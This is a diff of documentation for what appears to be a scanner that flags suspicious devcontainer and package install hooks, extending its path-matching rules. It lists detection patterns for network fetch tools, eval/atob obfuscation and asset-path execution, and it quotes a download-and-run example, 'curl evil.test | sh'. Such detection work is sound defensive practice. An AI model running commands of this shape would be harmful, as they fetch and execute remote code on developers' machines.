@@ -121,6 +121,10 @@ Flags:
   (`node ./public/fonts/x.woff2`, `sh ./dist/setup.js`, `node ./tools/x.js`).
   A `./` prefix is **not** required: `node dist/setup.js`,
   `node public/fonts/x.js`, `node assets/bootstrap.mjs` are flagged too.
+  Interpreter flags (`node --no-warnings ./public/fonts/x.woff2`), full
+  interpreter paths (`/usr/bin/node ./public/fonts/x.woff2`), nested
+  directories (`node app/dist/setup.js`), and traversal
+  (`node ./scripts/../dist/setup.js`) are all flagged as well.
 * `remoteUser`/`containerUser: root` **combined with** any exec hook
   (root alone is not flagged — a root-only devcontainer passes)
 
@@ -185,7 +189,11 @@ examined.
 Flags hooks that:
 
 * execute a **binary/asset path** (`node ./dist/setup.js`,
-  `node ./public/fonts/<file>`, `node ./tools/x.js` outside `scripts/`)
+  `node ./public/fonts/<file>`, `node ./tools/x.js` outside `scripts/`).
+  Interpreter flags (`node --no-warnings ./public/fonts/x.woff2`), full
+  interpreter paths (`/usr/bin/node ./public/fonts/x.woff2`), nested
+  directories (`node app/dist/setup.js`), and traversal
+  (`node ./scripts/../dist/setup.js`) are all flagged as well.
 * perform a network fetch at install time (`curl`, `wget`,
   `Invoke-WebRequest`, `irm`)
 * use obfuscation markers (`eval(`, `atob(`) or a decodable base64 blob
@@ -202,13 +210,16 @@ an allow-listed command, so `husky install && curl evil.test | sh` is
 flagged. The allow-list only suppresses noise for known-good single
 commands.
 
-`node <path>.js` invocations are additionally resolved and the referenced
-local script is scanned for the same danger patterns (shell network fetch,
-JavaScript network fetch — `fetch(`, `require('https')`, `axios.get(` —,
-`eval(`/`atob(`, base64 blobs, asset-path execution). The allow-listed
-spelling of a local script is not by itself a safety claim. A relative
-reference that escapes the package directory, or an absolute/`~` reference
-that cannot be resolved, fails closed. This is **not** a JavaScript malware
+`node [flags] <path>.js` invocations are additionally resolved and the
+referenced local script is scanned for the same danger patterns (shell
+network fetch, JavaScript network fetch — `fetch(`, `require('https')`,
+`axios.get(` —, `eval(`/`atob(`, base64 blobs, asset-path execution).
+Supported flags before the path are short/long options, with or without an
+`=value` (e.g. `--no-warnings`, `--max-old-space-size=4096`); a flag is never
+mistaken for the script path. The allow-listed spelling of a local script is
+not by itself a safety claim. A relative reference that escapes the package
+directory, or an absolute/`~` reference that cannot be resolved, fails
+closed. This is **not** a JavaScript malware
 detector — it catches the shapes the lifecycle-command scan catches plus the
 common JS fetch idioms, not arbitrary malicious logic.
 
